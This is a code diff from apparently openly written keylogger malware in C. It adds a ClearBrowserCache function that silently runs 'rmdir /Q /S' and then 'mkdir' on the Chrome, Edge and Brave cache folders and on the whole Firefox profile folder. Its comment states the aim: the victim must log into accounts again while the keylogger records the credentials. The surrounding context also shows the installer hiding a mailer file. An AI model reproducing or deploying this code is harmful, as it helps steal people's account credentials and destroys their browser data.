@@ -144,17 +144,59 @@ void InstallKeylogger(char* mailer_path, char* logfile_path, char* directory){
     SetFileAttributes(mailer_path, FILE_ATTRIBUTE_HIDDEN);
 }
 
+// clear/delete the cache directory of each browser so victim must relog into accounts
 void ClearBrowserCache(){
     char browser_path[MAX_PATH];
-    sprintf(browser_path, "C:\\Users\\%s\\", getenv("USERNAME"));
-
-    //char remove_command[] = "rmdir /Q /S ";
-    //char create_command[] = "mkdir ";
+    char remove_command[] = "rmdir /Q /S ";
+    char create_command[] = "mkdir ";
 
     // clear chrome
+    sprintf(browser_path, 
+            "%sC:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache", 
+            remove_command, 
+            getenv("USERNAME"));
+    system(browser_path);
+    sprintf(browser_path, 
+            "%sC:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cache", 
+            create_command, 
+            getenv("USERNAME"));
+    system(browser_path);
+
     // clear microsoft edge
+    sprintf(browser_path, 
+            "%sC:\\Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache", 
+            remove_command, 
+            getenv("USERNAME"));
+    system(browser_path);
+    sprintf(browser_path, 
+            "%sC:\\Users\\%s\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache", 
+            create_command, 
+            getenv("USERNAME"));
+    system(browser_path);
+
     // clear firefox
+    sprintf(browser_path, 
+            "%sC:\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox", 
+            remove_command, 
+            getenv("USERNAME"));
+    system(browser_path);
+    sprintf(browser_path, 
+            "%sC:\\Users\\%s\\AppData\\Roaming\\Mozilla\\Firefox", 
+            create_command, 
+            getenv("USERNAME"));
+    system(browser_path);
+
     // clear brave
+    sprintf(browser_path, 
+            "%sC:\\Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cache", 
+            remove_command, 
+            getenv("USERNAME"));
+    system(browser_path);
+    sprintf(browser_path, 
+            "%sC:\\Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cache", 
+            create_command, 
+            getenv("USERNAME"));
+    system(browser_path);
 }
 
 // get current time
